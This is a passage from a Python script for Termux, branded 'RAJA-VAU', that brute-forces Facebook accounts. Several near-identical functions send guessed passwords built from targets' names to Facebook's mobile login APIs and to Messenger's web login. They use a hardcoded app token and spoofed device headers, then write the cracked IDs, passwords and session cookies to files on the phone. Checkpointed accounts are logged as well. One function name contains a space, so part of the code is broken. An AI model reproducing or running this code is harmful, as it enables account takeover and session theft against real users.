                'source': 'login', 'error_detail_type': 'button_with_disabled', 'cpl': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)), 
                'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': random.choice(['CELL.3G', 'WIFI', 'MOBILE.LTE', 'unknown']), 
                'User-Agent': window1(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/auth/login'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m[RAJA-VAU✔] ' + ids + ' | ' + pas)
                q = po
                powerERROR = ';'.join((i['name'] + '=' + i['value'] for i in q['session_cookies']))
                ERRORramxan = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookie = f'sb={ERRORramxan};{powerERROR}'
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M5-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + cookie + '\n')
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M5-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print('\r\r\033[1;34m[RAJA-VAU-2F💥] ' + ids + ' | ' + pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                if 'y' in pcp:
                    print('\r\r\033[1;31m[RAJA-VAU-CP💥] ' + ids + ' | ' + pas + '\033[1;97m')
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M5-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M5-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api5(ids, names, passlist)
    except Exception as e:
        return None
def api6(ids, names, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M6\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            en = random.choice(['en_US', 'en_GB'])
            X620 = random.choice([
                'X697X663', 'X663B', 'PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 
                'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 
                'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 
                'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 
                'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 
                'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B'
            ])
            ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            network = random.choice(['Zong', 'null', 'Banglalink', 'Roshan', 'Marshmallow', 'Telekom China'])
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'[\"{xd}\"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join((random.choice(digits) for _ in range(2)))
            jazoest = li2 + j1
            __locale__ = {'en_US': 'US', 'en_GB': 'GB', 'es_ES': 'ES', 'fr_FR': 'FR', 'ar_SA': 'SA', 'bn_BD': 'BD', 'ja_JP': 'JP', 'de_DE': 'DE', 'pt_BR': 'BR'}
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            pax = random.choice(['PWD_FB4A', 'PWD_BROWSER'])
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 
                'password': f'#{pax}:0:{int(time.time())}:{pas}', 'session_id': str(uuid.uuid4()), 
                'enroll_misauth': 'false', 'generate_analytics_claims': '1', 'credentials_type': 'password', 
                'source': 'login', 'error_detail_type': 'button_with_disabled', 'cpl': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)), 
                'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': random.choice(['CELL.3G', 'WIFI', 'MOBILE.LTE', 'unknown']), 
                'User-Agent': _____UpDaTe_S1_____(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://api.facebook.com/auth/login'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m [RAJA-VAU✔] ' + ids + ' | ' + pas)
                get_coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                coki = f'sb={compile_coki};{get_coki}'
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M6-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M6-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                os.system('espeak -a 300 \"HEY,  YOU,  GOT,  OK,  ID\"')
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print('\r\r\033[1;34m[RAJA-VAU-2F💥] ' + ids + ' | ' + pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                if 'y' in pcp:
                    print('\r\r\033[1;31m[RAJA-VAU-CP💥] ' + ids + ' | ' + pas + '\033[1;97m')
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M6-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M6-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api6(ids, names, passlist)
    except Exception as e:
        return None

def api7(ids, names, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M7\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            en = random.choice(['en_US', 'en_GB'])
            X620 = random.choice([
                'X697X663', 'X663B', 'PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 
                'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 
                'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 
                'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 
                'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 
                'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B'
            ])
            ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            network = random.choice(['Zong', 'null', 'Banglalink', 'Roshan', 'Marshmallow', 'Telekom China'])
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'[\"{xd}\"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join((random.choice(digits) for _ in range(2)))
            jazoest = li2 + j1
            __locale__ = {'en_US': 'US', 'en_GB': 'GB', 'es_ES': 'ES', 'fr_FR': 'FR', 'ar_SA': 'SA', 'bn_BD': 'BD', 'ja_JP': 'JP', 'de_DE': 'DE', 'pt_BR': 'BR'}
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            pax = random.choice(['PWD_FB4A', 'PWD_BROWSER'])
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 
                'password': f'#{pax}:0:{int(time.time())}:{pas}', 'session_id': str(uuid.uuid4()), 
                'enroll_misauth': 'false', 'generate_analytics_claims': '1', 'credentials_type': 'password', 
                'source': 'login', 'error_detail_type': 'button_with_disabled', 'cpl': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)), 
                'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': random.choice(['CELL.3G', 'WIFI', 'MOBILE.LTE', 'unknown']), 
                'User-Agent': _____UpDaTe_S1_____(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://api.facebook.com/auth/login'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m [RAJA-VAU✔] ' + ids + ' | ' + pas)
                get_coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                coki = f'sb={compile_coki};{get_coki}'
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M7-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M7-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                os.system('espeak -a 300 \"HEY,  YOU,  GOT,  OK,  ID\"')
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print('\r\r\033[1;34m[RAJA-VAU-2F💥] ' + ids + ' | ' + pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                if 'y' in pcp:
                    print('\r\r\033[1;31m[RAJA-VAU-CP💥] ' + ids + ' | ' + pas + '\033[1;97m')
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M7-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M7-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api7(ids, names, passlist)
    except Exception as e:
        return None
def api8(ids, names, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M8\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            en = random.choice(['en_US', 'en_GB'])
            X620 = random.choice([
                'X697X663', 'X663B', 'PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 
                'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 
                'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 
                'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 
                'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 
                'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B'
            ])
            ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            network = random.choice(['Zong', 'null', 'Banglalink', 'Roshan', 'Marshmallow', 'Telekom China'])
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'[\"{xd}\"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join((random.choice(digits) for _ in range(2)))
            jazoest = li2 + j1
            __locale__ = {'en_US': 'US', 'en_GB': 'GB', 'es_ES': 'ES', 'fr_FR': 'FR', 'ar_SA': 'SA', 'bn_BD': 'BD', 'ja_JP': 'JP', 'de_DE': 'DE', 'pt_BR': 'BR'}
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            pax = random.choice(['PWD_FB4A', 'PWD_BROWSER'])
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 
                'password': f'#{pax}:0:{int(time.time())}:{pas}', 'session_id': str(uuid.uuid4()), 
                'enroll_misauth': 'false', 'generate_analytics_claims': '1', 'credentials_type': 'password', 
                'source': 'login', 'error_detail_type': 'button_with_disabled', 'cpl': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)), 
                'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': random.choice(['CELL.3G', 'WIFI', 'MOBILE.LTE', 'unknown']), 
                'User-Agent': best_redmi_ua(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://graph.facebook.com/auth/login'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m [RAJA-VAU✔] ' + ids + ' | ' + pas)
                get_coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                coki = f'sb={compile_coki};{get_coki}'
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M8-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M8-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                os.system('espeak -a 300 \"HEY,  YOU,  GOT,  OK,  ID\"')
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print('\r\r\033[1;34m[RAJA-VAU-2F💥] ' + ids + ' | ' + pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                if 'y' in pcp:
                    print('\r\r\033[1;31m[RAJA-VAU-CP💥] ' + ids + ' | ' + pas + '\033[1;97m')
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M8-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M8-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api8(ids, names, passlist)
    except Exception as e:
        return None

def RAJA VAU1(ids, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M1\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        ses = requests.Session()
        ua = random.choice(ugen)
        headers = {
            'Host': 'www.messenger.com', 'Connection': 'keep-alive', 'Content-Length': '267', 
            'Cache-Control': 'max-age=0', 'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"', 
            'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'Upgrade-Insecure-Requests': '1', 
            'Origin': 'https://www.messenger.com', 'Content-Type': 'application/x-www-form-urlencoded', 
            'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
            'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 
            'Sec-Fetch-Dest': 'document', 'Referer': 'https://www.messenger.com/', 'Accept-Encoding': 'gzip, deflate, br', 
            'Accept-Language': 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
        }
        reqs = ses.get('https://www.messenger.com/').text
        datr = re.search(r'_js_datr\",\"(.*?)\",', str(reqs)).group(1)
        data = {
            'jazoest': re.search(r'name=\"jazoest\" value=\"(.*?)\"', str(reqs)).group(1), 
            'lsd': re.search(r'name=\"lsd\" value=\"(.*?)\"', str(reqs)).group(1), 
            'initial_request_id': re.search(r'name=\"initial_request_id\" value=\"(.*?)\"', str(reqs)).group(1), 
            'timezone': '-300', 
            'lgndim': re.search(r'name=\"lgndim\" value=\"(.*?)\"', str(reqs)).group(1), 
            'lgnrnd': re.search(r'name=\"lgnrnd\" value=\"(.*?)\"', str(reqs)).group(1), 
            'lgnjs': 'n', 'email': ids, 'login': '1', 'default_persistent': ''
        }
        headers.update({'Cookie': f'wd=980x1715; dpr=2; _js_datr={datr}'})
        
        for pas in passlist:
            data.update({'pass': str(pas)})
            response = ses.post('https://www.messenger.com/login/password/', data=data, headers=headers, proxies=proxies, allow_redirects=False)
            if 'c_user' in ses.cookies.get_dict():
                coki = ses.cookies.get_dict()
                cok = 'datr=' + coki.get('datr', '') + ';sb=' + coki.get('sb', '') + ';locale=en_US;c_user=' + coki.get('c_user', '') + ';xs=' + coki.get('xs', '') + ';fr=' + base64.b64encode(os.urandom(30)).decode().replace('=', '').replace('+', '_').replace('/', '-') + ';m_page_voice=' + coki.get('c_user', '') + ';ps_n=0;ps_l=0;m_pixel_ratio=2;wd=360x820;'
                uid = coki.get('c_user', ids)
                if uid not in str(oks):
                    print(f'\r\r\033[1;32m[RAJA-VAU✔] {uid} | {pas}')
                    oks.append(uid)
                    open('/sdcard/RAJA-VAU/RAJA VAU-X-OK.txt', 'a').write(uid + '|' + pas + '\n')
                    break
            elif 'www.facebook.com%2Fcheckpoint' in str(response.headers.get('Location', '')):
                try:
                    x = str(response.headers)
                    cp_id = re.findall(r'3A(.*?)%2', str(x))[1]
                except:
                    cp_id = ids
                open('/sdcard/RAJA-VAU/RAJA VAU-X-CP.txt', 'a').write(cp_id + '|' + pas + '\n')
                if cp_id not in cps:
                    cps.append(cp_id)
                break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        RAJA VAU1(ids, passlist)
    except Exception as e:
        pass

# App Startup / Configuration Blocks
try:
    approval()
    menu()
except PermissionError:
    os.system('clear')
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PLEASE ENABLE STORAGE PERMISSION TO CONTINUE')
    os.system('termux-setup-storage')
    exit()

try:
    os.makedirs('/sdcard/ERROR-ZONE', exist_ok=True)
except Exception:
    pass

try:
    r = requests.get('https://www.google.com', timeout=10)
except requests.exceptions.Timeout:
    print('Internet connection timed out. Please try again.')

import requests
import random
